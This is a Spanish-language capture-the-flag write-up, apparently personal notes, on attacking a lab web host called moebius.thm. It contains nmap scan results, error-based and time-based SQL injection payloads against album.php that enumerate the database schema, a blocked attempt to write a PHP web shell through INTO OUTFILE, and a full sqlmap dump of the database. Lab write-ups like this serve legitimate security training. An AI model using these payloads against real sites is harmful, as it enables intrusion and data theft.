```
# Nmap 7.95 scan initiated Mon May 26 12:15:17 2025 as: /usr/lib/nmap/nmap --privileged -p- -n -Pn -sS --min-rate 5000 -oG ports 10.10.41.175
Host: 10.10.41.175 ()	Status: Up
Host: 10.10.41.175 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Mon May 26 12:15:32 2025 -- 1 IP address (1 host up) scanned in 15.05 seconds

# Nmap 7.95 scan initiated Mon May 26 12:19:18 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p22,80 -oG services 10.10.41.175
Host: 10.10.41.175 ()	Status: Up
Host: 10.10.41.175 ()	Ports: 22/open/tcp//ssh//OpenSSH 8.9p1 (protocol 2.0)/, 80/open/tcp//http//Apache httpd 2.4.62 ((Debian))/
# Nmap done at Mon May 26 12:19:31 2025 -- 1 IP address (1 host up) scanned in 12.56 seconds

```
--- 

deteccion de qr

![](Pasted%20image%2020250526112741.png)

solamete es un video de troleo

---
Encontramos uan url a modificar http://moebius.thm/album.php?short_tag=smart
al modificarlo nos encomtramos con lo siguiente
![](Pasted%20image%2020250526123442.png)

cuando probamos esta combinacion logramos eliminar el error y que es vulnerable al sql inyeccion
http://moebius.thm/album.php?short_tag=fav'%23
![](Pasted%20image%2020250526123532.png)

Despues definimos el tema de cuantas columna tiene esta base de datos y al aparece solamente es uno
http://moebius.thm/album.php?short_tag=fav' ORDER BY 2%23
![](Pasted%20image%2020250526123707.png)

Luegos nos toca extrear informacion pero al probar esto fracasamos
http://moebius.thm/album.php?short_tag=fav'%20UNION%20SELECT%20version()%23
Para que funcione tenemos que aplicar de esta manera
http://moebius.thm/album.php?short_tag=fav'%20AND%20(SELECT%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20version()))))%23

```
http://moebius.thm/album.php?short_tag=fav%27%20AND%20(SELECT%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20database()))))%23
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':web' 
```

```
http://moebius.thm/album.php?short_tag=fav'%20AND%20(SELECT%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1))))%23
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':albums' 
```


```
http://moebius.thm/album.php?short_tag=fav'%20AND%20(SELECT%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema='web'%20LIMIT%201,1))))%23
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':images' 
```

```
http://moebius.thm/album.php?short_tag=fav%27%20AND%20(SELECT%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27images%27%20AND%20table_schema=%27web%27%20LIMIT%200,1))))%23
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':id' 

1,1
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':album_id' 
2,1
 Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':path' 
 
```

```
http://moebius.thm/album.php?short_tag=fav%27%20AND%20(SELECT%20EXTRACTVALUE(1,CONCAT(0x3a,(SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27albums%27%20AND%20table_schema=%27web%27%20LIMIT%200,1))))%23
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':id' 

1,1
Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':short_tag' 
2,1
 Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':name' \
 3,1
 Connection failed: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':description' 
```


```
http://moebius.thm/album.php?short_tag=fav%27%20AND%20IF(SUBSTRING((SELECT%20user()),1,4)=%27root%27,SLEEP(5),0)%23
Warning: Trying to access array offset on false in /var/www/html/album.php on line 32
Connection failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1 


http://moebius.thm/album.php?short_tag=fav'%20UNION%20SELECT%20'<?php%20system($_GET[\"cmd\"]);%20?>'%20INTO%20OUTFILE%20'/var/www/html/shell.php'%23
Hacking attempt

http://moebius.thm/album.php?short_tag=fav%27%20UNION%20SELECT%20%27%3C?php%20system($_GET[\%22cmd\%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27%23
Hacking attempt
```

```
sqlmap -u "http://moebius.thm/album.php?short_tag=fav" -p short_tag -D web --dump-all --batch
+----------------+-----------+--------------------------+
| name           | short_tag | description              |
+----------------+-----------+--------------------------+
| Cute cats      | cute      | Cutest cats in the world |
| Favourite cats | fav       | My favourite ones        |
| Smart cats     | smart     | So smart...              |
+----------------+-----------+--------------------------+

[18:37:03] [INFO] table 'web.albums' dumped to CSV file '/home/kali/.local/share/sqlmap/output/moebius.thm/dump/web/albums.csv'
[18:37:03] [INFO] fetching columns for table 'images' in database 'web'
[18:37:03] [INFO] resumed: 'path','text'
[18:37:03] [INFO] fetching entries for table 'images' in database 'web'                                                                                                                                                                   
[18:37:04] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:05] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:05] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:05] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:06] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:06] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:06] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:07] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:07] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:07] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:08] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:08] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:08] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:09] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:09] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:09] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'
[18:37:10] [WARNING] possible server trimmed output detected (probably due to its length and/or content): ' in 'WHERE'                                                                                                                    
[18:37:10] [INFO] retrieved: '/var/www/images/cat1.jpg'
[18:37:10] [INFO] retrieved: '/var/www/images/cat10.webp'
[18:37:10] [INFO] retrieved: '/var/www/images/cat11.webp'
[18:37:11] [INFO] retrieved: '/var/www/images/cat12.webp'
[18:37:11] [INFO] retrieved: '/var/www/images/cat13.jpg'
[18:37:11] [INFO] retrieved: '/var/www/images/cat14.webp'
[18:37:12] [INFO] retrieved: '/var/www/images/cat15.webp'
[18:37:12] [INFO] retrieved: '/var/www/images/cat16.webp'
[18:37:12] [INFO] retrieved: '/var/www/images/cat2.jpg'
[18:37:12] [INFO] retrieved: '/var/www/images/cat3.jpg'
[18:37:13] [INFO] retrieved: '/var/www/images/cat4.jpg'
[18:37:13] [INFO] retrieved: '/var/www/images/cat5.avif'
[18:37:13] [INFO] retrieved: '/var/www/images/cat6.avif'
[18:37:14] [INFO] retrieved: '/var/www/images/cat7.png'
[18:37:14] [INFO] retrieved: '/var/www/images/cat8.webp'
[18:37:14] [INFO] retrieved: '/var/www/images/cat9.webp'
Database: web
Table: images
[16 entries]
[16 entries]
+----+----------------------------+----------+
| id | path                       | album_id |
+----+----------------------------+----------+
| 1  | /var/www/images/cat1.jpg   | 1        |
| 2  | /var/www/images/cat2.jpg   | 1        |
| 3  | /var/www/images/cat3.jpg   | 1        |
| 4  | /var/www/images/cat4.jpg   | 1        |
| 5  | /var/www/images/cat5.avif  | 1        |
| 6  | /var/www/images/cat6.avif  | 2        |
| 7  | /var/www/images/cat7.png   | 2        |
| 8  | /var/www/images/cat8.webp  | 2        |
| 9  | /var/www/images/cat9.webp  | 2        |
| 10 | /var/www/images/cat10.webp | 2        |
| 11 | /var/www/images/cat11.webp | 2        |
| 12 | /var/www/images/cat12.webp | 2        |
| 13 | /var/www/images/cat13.jpg  | 3        |
| 14 | /var/www/images/cat14.webp | 3        |
| 15 | /var/www/images/cat15.webp | 3        |
| 16 | /var/www/images/cat16.webp | 3        |
+----+----------------------------+----------+


```

